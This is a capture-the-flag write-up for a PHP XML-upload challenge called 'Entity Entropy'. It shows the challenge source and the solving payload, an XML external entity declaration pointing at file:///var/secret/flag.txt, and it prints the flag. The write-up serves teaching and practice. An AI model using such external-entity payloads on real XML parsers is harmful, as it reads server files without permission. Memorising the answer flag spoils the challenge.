# Entity Entropy

## Challenge Overview
In this challenge, we are presented with a web page that allows us to upload an XML file. The goal is to craft an XML payload that triggers certain conditions in the code to reveal a hidden flag.

![image](https://github.com/user-attachments/assets/11b29493-d310-49fa-a5e2-2ffa602518c0)

## Analysis
```php
<?php
// HTML content with Star Wars Dark Side theme
echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark Side Entity's Challenge</title>
    <style>
        body {
            background-color: black;
            color: red;
            font-family: 'Arial', sans-serif;
        }
        h1 {
            color: red;
        }
        .form-container {
            width: 50%;
            margin: auto;
            padding: 20px;
            border: 2px solid red;
            background-color: black;
        }
    </style>
</head>
<body>
    <h1>Welcome to the Dark Side Entity's Challenge</h1>
    <div class="form-container">
        <form action="index.php" method="post" enctype="multipart/form-data">
            <input type="file" name="xmlfile">
            <input type="submit" value="Execute Dark Ritual">
        </form>
    </div>
</body>
</html>
HTML;

$ext_ent_exists = false;
$darkside_el_exists = false;
$validate_el_exists = false;

function ext_ent_handler($parser, $name, $base, $systemId, $publicId) {
    if ($systemId === "file:///var/secret/flag.txt" && $name === "trigger") {
        echo "The Dark Side conceals its secrets well.<br>";
        $GLOBALS["ext_ent_exists"] = true;
        return true;
    }
    return false;
}

function el_handler_start($parser, $el_name, $el_attrs) {
    switch($el_name) {
    case "DARKSIDE":
        $GLOBALS["darkside_el_exists"] = true;
        break;
    case "VALIDATE":
        $GLOBALS["validate_el_exists"] = true;
        break;
    }
}

function el_handler_stop($parser, $el_name) {}

function isXMLFile($file) {
    $fileType = mime_content_type($file);
    return $fileType === 'text/xml' || $fileType === 'application/xml';
}

$xmlparser = xml_parser_create();
xml_set_external_entity_ref_handler($xmlparser, 'ext_ent_handler');
xml_set_element_handler($xmlparser, 'el_handler_start', 'el_handler_stop');

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['xmlfile'])) {
    $xmlfile = $_FILES['xmlfile']['tmp_name'];

        // Validate if the uploaded file is an XML file
    if (!isXMLFile($xmlfile)) {
        echo "Only XML files are allowed.<br>";
        exit;
    }

    // Validate file size (maximum 1024 bytes)
    if ($_FILES['xmlfile']['size'] > 1024) {
        echo "The Dark Side rejects your offering.<br>";
    } else {
        $xml_content = file_get_contents($xmlfile);
        xml_parse($xmlparser, $xml_content, true);
        if ($ext_ent_exists && $darkside_el_exists && $validate_el_exists) {
            $flag = file_get_contents('/var/secret/flag.txt');
            echo "The Dark Side reveals its secrets: $flag<br>";
        } else {
            echo "Invalid Dark Side invocation!<br>" . "\n";
        }
        xml_parser_free($xmlparser);
    }
}
?>
```
The provided `index.php` script handles XML file uploads and parses them with specific conditions:

1. **Check for XML File Type**: The script ensures that only XML files are processed and limits the file size to 1024 bytes.
2. **External Entity Handler**: The `ext_ent_handler` function sets the `$ext_ent_exists` variable to `true` if a specific external entity is used.
3. **Element Handler**: The `el_handler_start` function checks for the presence of `<DARKSIDE>` and `<VALIDATE>` elements to set the respective variables `$darkside_el_exists` and `$validate_el_exists` to `true`.


To reveal the flag, the script requires all three variables to be set to `true`.

## Solution
To achieve this, we need to:

1. **Create an XML Payload**: The payload must include:
   - An external entity declaration should refer to `/var/secret/flag.txt` and be triggered by the entity name `trigger`.
   - Include `<DARKSIDE>` and `<VALIDATE>` elements to set the corresponding variables to `true`.

2. **Upload the Payload**: Save the crafted payload as an XML file and upload it through the web page.

The final payload looks like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY trigger SYSTEM "file:///var/secret/flag.txt">
]>
<data>
    <DARKSIDE></DARKSIDE>
    &trigger;
    <VALIDATE></VALIDATE>
</data>
```

## Flag
```
ABOH23{C0mPl3X_ENT1T13S}
```
